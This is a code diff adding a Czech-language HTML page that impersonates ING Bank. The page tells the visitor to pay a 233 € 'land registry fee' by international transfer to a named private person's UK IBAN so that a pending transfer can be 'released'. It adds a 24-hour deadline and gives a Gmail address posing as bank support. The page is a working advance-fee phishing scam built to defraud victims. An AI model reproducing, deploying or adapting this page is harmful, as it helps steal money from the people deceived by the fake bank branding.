@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="UTF-8">
+    <title>Ověření banky Ing</title>
+    <link rel="stylesheet" href="./style.css">
+
+  </head>
+    
+  <body>
+  <!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ING Bank - Platba poplatku</title>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header class="ing-header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo-section">
+                    <div class="ing-logo">ING</div>
+                    <span class="bank-name">ING Bank</span>
+                </div>
+                
+                <nav class="main-nav">
+                    <a href="#" class="nav-link">Účty</a>
+                    <a href="#" class="nav-link active">Převody</a>
+                    <a href="#" class="nav-link">Karty</a>
+                    <a href="#" class="nav-link">Spoření</a>
+                </nav>
+                
+                <div class="user-actions">
+                    <button class="icon-btn">
+                        <i class="fas fa-bell"></i>
+                    </button>
+                    <button class="icon-btn">
+                        <i class="fas fa-user"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="container">
+            <nav class="breadcrumb">
+                <a href="index.html" class="breadcrumb-link">Domů</a>
+                <i class="fas fa-chevron-right"></i>
+                <a href="index.html" class="breadcrumb-link">Převody</a>
+                <i class="fas fa-chevron-right"></i>
+                <a href="index.html" class="breadcrumb-link">Stav převodu</a>
+                <i class="fas fa-chevron-right"></i>
+                <span class="breadcrumb-current">Platba</span>
+            </nav>
+
+            <section class="payment-card">
+                <div class="card-header">
+                    <h1 class="page-title">Platba poplatku za zápis do katastru nemovitostí</h1>
+                </div>
+
+                <div class="payment-amount-section">
+                    <div class="amount-display">
+                        <span class="amount-label">Částka k úhradě:</span>
+                        <span class="amount-value">233 €</span>
+                    </div>
+                    <p class="amount-description">Poplatek za dokončení převodu</p>
+                </div>
+
+                <div class="bank-details-section">
+                    <h2 class="section-title">
+                        <i class="fas fa-university text-orange"></i>
+                        Bankovní údaje pro převod
+                    </h2>
+                    
+                    <div class="bank-details">
+                        <div class="detail-row">
+                            <span class="detail-label">Jméno:</span>
+                            <span class="detail-value">CORALIE MELANIE BLANDINE THUILIER</span>
+                        </div>
+                        
+                        <div class="detail-row">
+                            <span class="detail-label">IBAN:</span>
+                            <span class="detail-value iban-display">GB29 CLJU 0413 0767 6387 45</span>
+                        </div>
+                        
+                        <div class="detail-row">
+                            <span class="detail-label">BIC/SWIFT:</span>
+                            <span class="detail-value bic-display">CLJUGB21</span>
+                        </div>
+                        
+                        <div class="detail-row">
+                            <span class="detail-label">Referenční číslo:</span>
+                            <span class="detail-value">Service</span>
+                        </div>
+                        
+                        <div class="detail-row">
+                            <span class="detail-label">Typ převodu:</span>
+                            <span class="detail-value transfer-type">Okamžitý převod</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="instructions-section">
+                    <h3 class="instructions-title">
+                        <i class="fas fa-info-circle text-orange"></i>
+                        Pokyny k platbě
+                    </h3>
+                    <ul class="instructions-list">
+                        <li>Zkopírujte výše uvedené bankovní údaje</li>
+                        <li>Přihlaste se do svého internetového bankovnictví</li>
+                        <li>Vytvořte nový mezinárodní převod</li>
+                        <li>Vyplňte všechny požadované údaje včetně referenčního čísla "Service"</li>
+                        <li>Potvrďte platbu částky 233 €</li>
+                        <li>Po dokončení platby bude váš převod automaticky ověřen</li>
+                    </ul>
+                </div>
+
+                <div class="payment-alert">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <div class="alert-content">
+                        <p><strong>Důležité:</strong> Platba musí být provedena do 24 hodin. Po obdržení platby budou prostředky okamžitě uvolněny na váš účet.</p>
+                    </div>
+                </div>
+
+                <div class="payment-actions">
+                    <button class="btn btn-primary" onclick="copyIBAN()">
+                        <i class="fas fa-copy"></i>
+                        Zkopírovat IBAN
+                    </button>
+                    <button class="btn btn-secondary" onclick="window.location.href='index.html'">
+                        <i class="fas fa-arrow-left"></i>
+                        Zpět na stav převodu
+                    </button>
+                    <button class="btn btn-secondary" onclick="window.location.href='mailto:nathalielindn@gmail.com'">
+                        <i class="fas fa-envelope"></i>
+                        Kontaktovat podporu
+                    </button>
+                </div>
+            </section>
+        </div>
+    </main>
+
+    <footer class="ing-footer">
+        <div class="container">
+            <div class="footer-grid">
+                <div class="footer-brand">
+                    <div class="footer-logo">
+                        <div class="ing-logo">ING</div>
+                        <span class="bank-name">ING Bank</span>
+                    </div>
+                    <p>Váš důvěryhodný bankovní partner</p>
+                </div>
+                
+                <div class="footer-section">
+                    <h3>Služby</h3>
+                    <ul>
+                        <li><a href="#">Účty</a></li>
+                        <li><a href="#">Převody</a></li>
+                        <li><a href="#">Spoření</a></li>
+                        <li><a href="#">Úvěry</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h3>Podpora</h3>
+                    <ul>
+                        <li><a href="#">Centrum nápovědy</a></li>
+                        <li><a href="#">Kontakt</a></li>
+                        <li><a href="#">FAQ</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h3>Právní informace</h3>
+                    <ul>
+                        <li><a href="#">Podmínky</a></li>
+                        <li><a href="#">Ochrana soukromí</a></li>
+                        <li><a href="#">Bezpečnost</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <p>&copy; 2025 ING Bank. Všechna práva vyhrazena.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="payment.js"></script>
+</body>
+</html>
+    <script  src="./script.js"></script>
+
+  </body>
+  
+</html>
